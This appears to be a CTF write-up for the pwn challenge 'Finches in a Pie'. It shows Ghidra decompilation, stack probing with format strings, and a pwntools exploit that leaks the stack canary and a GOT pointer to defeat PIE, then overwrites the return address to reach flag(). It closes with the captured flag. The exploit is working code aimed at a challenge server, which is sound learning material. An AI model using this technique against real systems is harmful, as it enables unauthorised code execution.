
# Finches in a Pie

## Description

```
Challenge instance ready at 88.198.219.20:27813.

There's a service at ..., exploit it to get the flag.
```

Category: Pwn

## Analysis

What are we dealing with?

```
kali@kali:~/Downloads/ractf/finches_in_a_pie$ file fiap
fiap: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=07c3106195f072f2c3eff4ee1d4a581503c6284e, for GNU/Linux 3.2.0, not stripped
kali@kali:~/Downloads/ractf/finches_in_a_pie$ checksec fiap
[*] '/home/kali/Downloads/ractf/finches_in_a_pie/fiap'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Decompile with Ghidra. It looks pretty similar to [Finches in a Stack](../finches_in_a_stack/), except PIE is enabled this time.

```c
undefined4 main(void)

{
  __gid_t __rgid;
  
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  __rgid = getegid();
  setresgid(__rgid,__rgid,__rgid);
  my_pie();
  say_hi();
  return 0;
}
```

```c
void say_hi(void)

{
  char cVar1;
  uint uVar2;
  char *pcVar3;
  int in_GS_OFFSET;
  byte bVar4;
  char local_29 [4];
  undefined2 uStack37;
  undefined local_22 [18];
  int local_10;
  
  bVar4 = 0;
  local_10 = *(int *)(in_GS_OFFSET + 0x14);
  puts("CATCH HIM!\n");
  puts("You got him! Thank you!");
  puts("What\'s your name?");
  gets((char *)((int)&uStack37 + 1));
  printf("Thank you, ");
  uVar2 = 0xffffffff;
  pcVar3 = (char *)((int)&uStack37 + 1);
  do {
    if (uVar2 == 0) break;
    uVar2 = uVar2 - 1;
    cVar1 = *pcVar3;
    pcVar3 = pcVar3 + (uint)bVar4 * -2 + 1;
  } while (cVar1 != '\0');
  *(undefined2 *)((int)&uStack37 + ~uVar2) = 0xa21;
  *(undefined *)((int)&uStack37 + ~uVar2 + 2) = 0;
  printf((char *)((int)&uStack37 + 1));
  puts("Would you like some cake?");
  gets(local_29);
  if (local_10 != *(int *)(in_GS_OFFSET + 0x14)) {
    __stack_chk_fail_local();
  }
  return;
}
```

```c
void flag(void)

{
  int iVar1;
  
  iVar1 = __x86.get_pc_thunk.ax();
  system((char *)(iVar1 + 0xdf3));
  return;
}
```

We know the canary will change, but the MSB will always be 0, so let's start with getting the first 16 stack elements.

```
kali@kali:~/Downloads/ractf/finches_in_a_pie$ for i in `seq 1 16`; do echo "%${i}\$p" | ./fiap; done | grep "Thank you, "
Thank you, 0xf7f082c0!
Thank you, 0x3e8!
Thank you, 0x5660028f!
Thank you, 0xf7ee3000!
Thank you, 0xf7f65000!
Thank you, 0x70243625!
Thank you, 0x56000a21!
Thank you, 0x5661f036!
Thank you, 0xf7f52940!
Thank you, 0x565cb000!
Thank you, 0x58e1bf00!
Thank you, 0x565be000!
Thank you, 0xf7ed2000!
Thank you, 0xffaa05a8!
Thank you, 0x566143d9!
Thank you, 0x1!
kali@kali:~/Downloads/ractf/finches_in_a_pie$ for i in `seq 1 16`; do echo "%${i}\$p" | ./fiap; done | grep "Thank you, "
Thank you, 0xf7f312c0!
Thank you, 0x3e8!
Thank you, 0x565bf28f!
Thank you, 0xf7f11000!
Thank you, 0xf7f52000!
Thank you, 0x70243625!
Thank you, 0x56000a21!
Thank you, 0x565cb036!
Thank you, 0xf7fc1940!
Thank you, 0x565b9000!
Thank you, 0x8931aa00!
Thank you, 0x56635000!
Thank you, 0xf7f29000!
Thank you, 0xffd7bcb8!
Thank you, 0x5661f3d9!
Thank you, 0x1!
```

11 looks like a winner:

```
kali@kali:~/Downloads/ractf/finches_in_a_pie$ echo '%11$p' | ./fiap | grep 'Thank you, '
Thank you, 0x1e56e500!
kali@kali:~/Downloads/ractf/finches_in_a_pie$ echo '%11$p' | ./fiap | grep 'Thank you, '
Thank you, 0x9a92b300!
kali@kali:~/Downloads/ractf/finches_in_a_pie$ echo '%11$p' | ./fiap | grep 'Thank you, '
Thank you, 0x887e5000!
kali@kali:~/Downloads/ractf/finches_in_a_pie$ echo '%11$p' | ./fiap | grep 'Thank you, '
Thank you, 0x36e7e200!
```

Indeed, we can use that to get past the canary:

```python
#!/usr/bin/env python3
from pwn import *

context.log_level='DEBUG'
binary = ELF('./fiap')
print("flag(): %x\n" % binary.symbols['flag'])

p = process('./fiap')
#p = remote('88.198.219.20', 27813)
p.recvuntil("What's your name?")
p.sendline('%11$p')
p.recvuntil("Thank you, ")
line = p.recvline()
canary = int(line.decode()[:-2], 16)
print("canary: %x\n" % canary)

p.recvuntil("Would you like some cake?")
payload = b'B' * (25)
payload += p32(canary)
payload += p32(binary.symbols['flag']) * 4
p.sendline(payload)
p.stream()
```

```
kali@kali:~/Downloads/ractf/finches_in_a_pie$ ./exploit.py | grep -v JAVA
[DEBUG] PLT 0x1030 printf
[DEBUG] PLT 0x1040 gets
[DEBUG] PLT 0x1050 __stack_chk_fail
[DEBUG] PLT 0x1060 getegid
[DEBUG] PLT 0x1070 puts
[DEBUG] PLT 0x1080 system
[DEBUG] PLT 0x1090 __libc_start_main
[DEBUG] PLT 0x10a0 setvbuf
[DEBUG] PLT 0x10b0 setresgid
[DEBUG] PLT 0x10c0 __cxa_finalize
[*] '/home/kali/Downloads/ractf/finches_in_a_pie/fiap'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
flag(): 1209

[DEBUG] Received 0x63 bytes:
    b'Oh my!\n'
    b'\n'
    b'You NAUGHTY CANARY\n'
    b'\n'
    b'You ATE MY PIE!\n'
    b'\n'
    b'CATCH HIM!\n'
    b'\n'
    b'You got him! Thank you!\n'
    b"What's your name?\n"
[DEBUG] Sent 0x6 bytes:
    b'%11$p\n'
[DEBUG] Received 0x31 bytes:
    b'Thank you, 0x2b092200!\n'
    b'Would you like some cake?\n'
canary: 2b092200

[DEBUG] Sent 0x2e bytes:
    00000000  42 42 42 42  42 42 42 42  42 42 42 42  42 42 42 42  │BBBB│BBBB│BBBB│BBBB│
    00000010  42 42 42 42  42 42 42 42  42 00 22 09  2b 09 12 00  │BBBB│BBBB│B·"·│+···│
    00000020  00 09 12 00  00 09 12 00  00 09 12 00  00 0a        │····│····│····│··│
    0000002e

```

Now how do we work past PIE? The flag function is at 0x1209, which is an offset.

```
00001209 <flag>:
    1209:       55                      push   %ebp
    120a:       89 e5                   mov    %esp,%ebp
    120c:       53                      push   %ebx
    120d:       83 ec 04                sub    $0x4,%esp
    1210:       e8 d3 01 00 00          call   13e8 <__x86.get_pc_thunk.ax>
    1215:       05 eb 2d 00 00          add    $0x2deb,%eax
    121a:       83 ec 0c                sub    $0xc,%esp
    121d:       8d 90 08 e0 ff ff       lea    -0x1ff8(%eax),%edx
    1223:       52                      push   %edx
    1224:       89 c3                   mov    %eax,%ebx
    1226:       e8 55 fe ff ff          call   1080 <system@plt>
    122b:       83 c4 10                add    $0x10,%esp
    122e:       90                      nop   
    122f:       8b 5d fc                mov    -0x4(%ebp),%ebx
    1232:       c9                      leave 
    1233:       c3                      ret  
```

Background reading:

* <https://book.hacktricks.xyz/exploiting/linux-exploiting-basic-esp/bypassing-canary-and-pie>

* <https://ironhackers.es/en/tutoriales/pwn-rop-bypass-nx-aslr-pie-y-canary/>

Let's print those stack elements out again.

```
kali@kali:~/Downloads/ractf/finches_in_a_pie$ for i in `seq 1 16`; do echo "%${i}\$p" | ./fiap | grep "Thank you, "; echo $i; done
Thank you, 0xf7ef22c0!
1
Thank you, 0x3e8!
2
Thank you, 0x5655728f!
3
Thank you, 0xf7ed7000!
4
Thank you, 0xf7ec6000!
5
Thank you, 0x70243625!
6
Thank you, 0x56000a21!
7
Thank you, 0x565ef036!
8
Thank you, 0xf7f15940!
9
Thank you, 0x565af000!
10
Thank you, 0xb4eabd00!
11
Thank you, 0x5657c000!
12
Thank you, 0xf7f4e000!
13
Thank you, 0xffa40688!
14
Thank you, 0x565973d9!
15
Thank you, 0x1!
16
```

We already know 11 is our canary, and 12 looks like it could be used to calculate the address of `flag()`. It points to the GOT (global offset table):

```
(gdb) run
Starting program: /home/kali/Downloads/ractf/finches_in_a_pie/fiap
Oh my!

You NAUGHTY CANARY

You ATE MY PIE!

CATCH HIM!

You got him! Thank you!
What's your name?
%11$p-%12$p
Thank you, 0x4cc61400-0x56559000!
Would you like some cake?
^C
Program received signal SIGINT, Interrupt.
(gdb) disas 0x56559000
Dump of assembler code for function _GLOBAL_OFFSET_TABLE_:
   0x56559000:  hlt    
   0x56559001:  add    %al,%ds:(%eax)
   0x56559004:  inc    %eax
   0x56559005:  fcos   
   0x56559007:  divl   0x50f7fe92(%eax)
End of assembler dump.
```

We want to jump to `flag()`, so calculate the offset from the GOT pointer that we found on the stack.

```
Dump of assembler code for function flag:
   0x56556209 <+0>:     push   %ebp
   0x5655620a <+1>:     mov    %esp,%ebp
   0x5655620c <+3>:     push   %ebx
   0x5655620d <+4>:     sub    $0x4,%esp
   0x56556210 <+7>:     call   0x565563e8 <__x86.get_pc_thunk.ax>
   0x56556215 <+12>:    add    $0x2deb,%eax
   0x5655621a <+17>:    sub    $0xc,%esp
   0x5655621d <+20>:    lea    -0x1ff8(%eax),%edx
   0x56556223 <+26>:    push   %edx
   0x56556224 <+27>:    mov    %eax,%ebx
   0x56556226 <+29>:    call   0x56556080 <system@plt>
   0x5655622b <+34>:    add    $0x10,%esp
   0x5655622e <+37>:    nop
   0x5655622f <+38>:    mov    -0x4(%ebp),%ebx
   0x56556232 <+41>:    leave  
   0x56556233 <+42>:    ret    
End of assembler dump.
(gdb) p/x 0x56559000 - 0x56556209
$8 = 0x2df7
```

With this offset in hand, we just have to extend the exploit to leak the GOT address, then use that to calculate the address of `flag()`, which we will use to overwrite the return address and get our flag from the server.

## Solution

```python
#!/usr/bin/env python3
from pwn import *

context.log_level='DEBUG'
binary = ELF('./fiap')
#p = process('./fiap')
p = remote('88.198.219.20', 27813)
p.recvuntil("What's your name?")
p.sendline('%11$p-%12$p')
p.recvuntil("Thank you, ")
addrs = p.recvline().decode()[:-2].split('-')

canary = int(addrs[0], 16)
print("canary: %x\n" % canary)
pie = int(addrs[1], 16)
print("pie: %x\n" % pie)
flag_addr = pie - 0x2df7
print("flag() addr: %x\n" % flag_addr)

p.recvuntil("Would you like some cake?")
payload = b'B' * (25)
payload += p32(canary)
payload += p32(flag_addr) * 4
p.sendline(payload)
p.recvline()
p.stream()
```

```
kali@kali:~/Downloads/ractf/finches_in_a_pie$ ./exploit.py 
[DEBUG] PLT 0x1030 printf
[DEBUG] PLT 0x1040 gets
[DEBUG] PLT 0x1050 __stack_chk_fail
[DEBUG] PLT 0x1060 getegid
[DEBUG] PLT 0x1070 puts
[DEBUG] PLT 0x1080 system
[DEBUG] PLT 0x1090 __libc_start_main
[DEBUG] PLT 0x10a0 setvbuf
[DEBUG] PLT 0x10b0 setresgid
[DEBUG] PLT 0x10c0 __cxa_finalize
[*] '/home/kali/Downloads/ractf/finches_in_a_pie/fiap'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 88.198.219.20 on port 27813: Done
[DEBUG] Received 0x63 bytes:
    b'Oh my!\n'
    b'\n'
    b'You NAUGHTY CANARY\n'
    b'\n'
    b'You ATE MY PIE!\n'
    b'\n'
    b'CATCH HIM!\n'
    b'\n'
    b'You got him! Thank you!\n'
    b"What's your name?\n"
[DEBUG] Sent 0xc bytes:
    b'%11$p-%12$p\n'
[DEBUG] Received 0x3c bytes:
    b'Thank you, 0x5a09dd00-0x565ec000!\n'
    b'Would you like some cake?\n'
canary: 5a09dd00

pie: 565ec000

flag() addr: 565e9209

[DEBUG] Sent 0x2e bytes:
    00000000  42 42 42 42  42 42 42 42  42 42 42 42  42 42 42 42  │BBBB│BBBB│BBBB│BBBB│
    00000010  42 42 42 42  42 42 42 42  42 00 dd 09  5a 09 92 5e  │BBBB│BBBB│B···│Z··^│
    00000020  56 09 92 5e  56 09 92 5e  56 09 92 5e  56 0a        │V··^│V··^│V··^│V·│
    0000002e
[DEBUG] Received 0x15 bytes:
    b'ractf{B4k1ng_4_p1E!}\n'
ractf{B4k1ng_4_p1E!}
```

The flag is:

```
ractf{B4k1ng_4_p1E!}
```

